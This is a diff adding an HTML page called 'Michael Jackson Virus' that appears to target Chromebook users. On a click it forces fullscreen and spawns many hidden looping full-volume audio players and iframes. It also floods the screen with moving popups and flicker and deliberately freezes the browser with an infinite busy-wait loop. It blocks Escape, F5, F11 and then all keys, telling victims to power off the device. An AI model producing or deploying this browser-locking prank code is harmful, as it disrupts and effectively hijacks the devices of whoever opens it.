@@ -1,0 +1,377 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Michael Jackson</title>
+<style>
+  * { margin: 0; padding: 0; box-sizing: border-box; }
+  html, body {
+    background: #000;
+    color: #fff;
+    font-family: Arial, sans-serif;
+    overflow: hidden;
+    height: 100%;
+    width: 100%;
+    cursor: pointer;
+  }
+  #start-screen {
+    position: fixed;
+    inset: 0;
+    display: flex;
+    flex-direction: column;
+    align-items: center;
+    justify-content: center;
+    text-align: center;
+    z-index: 99999;
+    background: #000;
+    cursor: pointer;
+  }
+  #start-screen h1 {
+    font-size: 2.8rem;
+    margin-bottom: 18px;
+    color: #ff0;
+    text-shadow: 0 0 12px #f0f, 0 0 24px #0ff, 0 0 36px #f0f;
+    pointer-events: none;
+  }
+  #start-screen p {
+    font-size: 1.25rem;
+    margin: 8px 0;
+    color: #eee;
+    pointer-events: none;
+  }
+  #enter-btn {
+    margin-top: 28px;
+    padding: 16px 48px;
+    font-size: 1.6rem;
+    background: #f0f;
+    color: #000;
+    border: none;
+    border-radius: 10px;
+    cursor: pointer;
+    font-weight: 900;
+    box-shadow: 0 0 25px #f0f, 0 0 50px #f0f;
+    letter-spacing: 2px;
+  }
+  #enter-btn:hover {
+    background: #ff0;
+    box-shadow: 0 0 40px #ff0;
+  }
+  .hint {
+    margin-top: 22px;
+    font-size: 0.95rem;
+    color: #aaa;
+    pointer-events: none;
+  }
+  .popup {
+    position: fixed;
+    border: 4px solid #f0f;
+    background: #111;
+    z-index: 10000;
+    box-shadow: 0 0 20px #f0f, 0 0 40px #f0f;
+    overflow: hidden;
+    will-change: transform, left, top;
+  }
+  .popup-header {
+    background: #f0f;
+    color: #000;
+    padding: 6px 10px;
+    font-weight: 900;
+    font-size: 13px;
+    display: flex;
+    justify-content: space-between;
+    align-items: center;
+    user-select: none;
+  }
+  .popup img {
+    width: 100%;
+    height: auto;
+    display: block;
+  }
+  #audio-box {
+    position: fixed;
+    left: -9999px;
+    top: 0;
+    width: 1px;
+    height: 1px;
+    opacity: 0;
+    pointer-events: none;
+  }
+  .ghost {
+    position: fixed;
+    pointer-events: none;
+    z-index: 5000;
+    background-size: cover;
+    background-position: center;
+    opacity: 0.25;
+    will-change: transform, opacity;
+  }
+  .scan {
+    position: fixed;
+    inset: 0;
+    pointer-events: none;
+    z-index: 6000;
+    background: repeating-linear-gradient(
+      0deg,
+      transparent 0px,
+      transparent 3px,
+      rgba(255,0,255,0.04) 3px,
+      rgba(255,0,255,0.04) 6px
+    );
+    animation: glitch 0.08s infinite linear;
+  }
+  @keyframes glitch {
+    0% { transform: translate(0,0); }
+    25% { transform: translate(-3px,1px); }
+    50% { transform: translate(3px,-2px); }
+    75% { transform: translate(-1px,3px); }
+    100% { transform: translate(0,0); }
+  }
+  #freeze-overlay {
+    display: none;
+    position: fixed;
+    inset: 0;
+    z-index: 999999;
+    background: #000;
+    color: #f0f;
+    font-size: 2rem;
+    font-weight: 900;
+    align-items: center;
+    justify-content: center;
+    text-align: center;
+    flex-direction: column;
+    pointer-events: all;
+  }
+</style>
+</head>
+<body>
+  <div id="start-screen">
+    <h1>Michael Jackson Virus</h1>
+    <p>Click ENTER on your Chromebook</p>
+    <p>When you click ENTER on your Chromebook</p>
+    <p>Don't buy it on your Chromebook account</p>
+    <p>Interact — Click ENTER</p>
+    <button id="enter-btn">ENTER</button>
+    <div class="hint">or just click anywhere on the screen</div>
+  </div>
+
+  <div id="audio-box"></div>
+  <div id="freeze-overlay">
+    <div>MICHAEL JACKSON IS WATCHING</div>
+    <div style="font-size:1.1rem;margin-top:16px;color:#ff0">TURN OFF YOUR CHROMEBOOK TO ESCAPE</div>
+  </div>
+
+  <script>
+    const GIF = "https://i0.wp.com/media2.giphy.com/media/qznIrI82I0EVi/giphy.gif";
+    const AUDIO_SRC = "https://www.myinstants.com/media/sounds/michael-dont-leave-me-here.mp3";
+    const AUDIO_EMBED = "https://www.myinstants.com/instant/michael-dont-leave-me-here-42269/embed/";
+
+    let popupCount = 0;
+    const HARD_CAP = 80;
+    let audioNodes = [];
+    let ghostTimer = null;
+    let popupTimer = null;
+    let freezeArmed = false;
+    let launched = false;
+
+    function rand(min, max) {
+      return Math.floor(Math.random() * (max - min + 1)) + min;
+    }
+
+    function randomPos(w = 210, h = 240) {
+      return {
+        x: rand(0, Math.max(0, window.innerWidth - w)),
+        y: rand(0, Math.max(0, window.innerHeight - h))
+      };
+    }
+
+    // ---------- AUDIO (stays alive even after freeze) ----------
+    function makeLoudAudio() {
+      try {
+        const a = new Audio(AUDIO_SRC);
+        a.volume = 1.0;
+        a.loop = true;
+        a.play().catch(() => {});
+        audioNodes.push(a);
+        // keep it from being garbage-collected
+        window._mjAudio = window._mjAudio || [];
+        window._mjAudio.push(a);
+      } catch (e) {}
+    }
+
+    function spamAudio() {
+      // burst of looping players
+      for (let i = 0; i < 16; i++) {
+        setTimeout(makeLoudAudio, i * 30);
+      }
+      // keep adding more for a while (before the hard freeze)
+      const audioSpawner = setInterval(() => {
+        if (freezeArmed) {
+          // even after freeze we try one last wave (may or may not run)
+          makeLoudAudio();
+          makeLoudAudio();
+          makeLoudAudio();
+          clearInterval(audioSpawner);
+          return;
+        }
+        makeLoudAudio();
+        makeLoudAudio();
+      }, 500);
+
+      // hidden iframes as extra persistent audio sources
+      const box = document.getElementById("audio-box");
+      for (let i = 0; i < 8; i++) {
+        const ifr = document.createElement("iframe");
+        ifr.src = AUDIO_EMBED + "?t=" + Date.now() + i;
+        ifr.allow = "autoplay";
+        ifr.setAttribute("allow", "autoplay; encrypted-media");
+        ifr.style.cssText = "width:1px;height:1px;border:0;opacity:0;position:absolute;left:-9999px;";
+        box.appendChild(ifr);
+      }
+    }
+
+    // ---------- POPUPS ----------
+    function createPopup() {
+      if (popupCount >= HARD_CAP) return;
+      popupCount++;
+      const pos = randomPos();
+      const el = document.createElement("div");
+      el.className = "popup";
+      el.style.left = pos.x + "px";
+      el.style.top = pos.y + "px";
+      el.style.width = rand(180, 260) + "px";
+      el.innerHTML = `
+        <div class="popup-header">
+          <span>Michael Jackson's watching</span>
+          <span style="cursor:pointer;font-size:16px" onclick="this.parentElement.parentElement.remove();popupCount=Math.max(0,popupCount-1)">×</span>
+        </div>
+        <img src="${GIF}" alt="MJ" loading="eager" decoding="sync">
+      `;
+      document.body.appendChild(el);
+
+      const jitter = setInterval(() => {
+        if (!el.parentNode) { clearInterval(jitter); return; }
+        const p = randomPos(parseInt(el.style.width) || 200, 240);
+        el.style.left = p.x + "px";
+        el.style.top = p.y + "px";
+      }, 400 + Math.random() * 400);
+    }
+
+    function startPopupSpam() {
+      for (let i = 0; i < 18; i++) setTimeout(createPopup, i * 35);
+      popupTimer = setInterval(() => {
+        createPopup();
+        createPopup();
+        createPopup();
+      }, 180);
+    }
+
+    // ---------- CHAOS + FREEZE (audio keeps going) ----------
+    function startChaos() {
+      for (let i = 0; i < 25; i++) {
+        const s = document.createElement("div");
+        s.className = "scan";
+        s.style.opacity = (0.03 + Math.random() * 0.07).toFixed(2);
+        s.style.animationDuration = (0.05 + Math.random() * 0.12) + "s";
+        document.body.appendChild(s);
+      }
+
+      ghostTimer = setInterval(() => {
+        for (let i = 0; i < 25; i++) {
+          const g = document.createElement("div");
+          g.className = "ghost";
+          const size = rand(40, 160);
+          g.style.width = size + "px";
+          g.style.height = size + "px";
+          g.style.left = rand(0, 100) + "%";
+          g.style.top = rand(0, 100) + "%";
+          g.style.backgroundImage = `url(${GIF})`;
+          g.style.transform = `rotate(${rand(0, 360)}deg) scale(${(0.6 + Math.random()).toFixed(2)})`;
+          document.body.appendChild(g);
+          setTimeout(() => g.remove(), 280);
+        }
+        void document.body.offsetHeight;
+        void document.body.offsetWidth;
+      }, 40);
+
+      function deathLoop() {
+        let x = 0;
+        for (let i = 0; i < 2e6; i++) {
+          x += Math.sin(i) * Math.cos(i * 0.5);
+        }
+        for (let j = 0; j < 8; j++) {
+          const d = document.createElement("div");
+          d.style.cssText = `position:fixed;left:${Math.random()*100}%;top:${Math.random()*100}%;width:30px;height:30px;background:url(${GIF}) center/cover;opacity:0.2;z-index:4000;pointer-events:none;`;
+          document.body.appendChild(d);
+          setTimeout(() => d.remove(), 150);
+        }
+        setTimeout(deathLoop, 0);
+      }
+      deathLoop();
+
+      // hard freeze after 4.5s — UI dies, but audio elements + iframes keep playing
+      setTimeout(() => {
+        freezeArmed = true;
+        if (ghostTimer) clearInterval(ghostTimer);
+        if (popupTimer) clearInterval(popupTimer);
+
+        // final audio surge right before lock
+        for (let i = 0; i < 10; i++) makeLoudAudio();
+
+        const overlay = document.getElementById("freeze-overlay");
+        overlay.style.display = "flex";
+
+        // pure busy-wait — freezes main thread / UI, audio continues in background
+        function totalFreeze() {
+          while (true) {
+            let y = 0;
+            for (let k = 0; k < 5e6; k++) y += k;
+          }
+        }
+        totalFreeze();
+      }, 4500);
+    }
+
+    function launch() {
+      if (launched) return;
+      launched = true;
+      document.getElementById("start-screen").style.display = "none";
+      document.body.style.cursor = "none";
+
+      try {
+        const el = document.documentElement;
+        if (el.requestFullscreen) el.requestFullscreen();
+        else if (el.webkitRequestFullscreen) el.webkitRequestFullscreen();
+      } catch (e) {}
+
+      spamAudio();
+      startPopupSpam();
+      startChaos();
+    }
+
+    document.getElementById("enter-btn").addEventListener("click", function(e) {
+      e.stopPropagation();
+      launch();
+    });
+
+    document.getElementById("start-screen").addEventListener("click", launch);
+
+    document.addEventListener("keydown", e => {
+      if (e.key === "Enter" && !launched) {
+        launch();
+      }
+    });
+
+    window.addEventListener("keydown", e => {
+      if (freezeArmed) {
+        e.preventDefault();
+        e.stopPropagation();
+        return false;
+      }
+      if (["Escape", "F11", "F5"].includes(e.key)) {
+        e.preventDefault();
+      }
+    }, true);
+  </script>
+</body>
+</html>
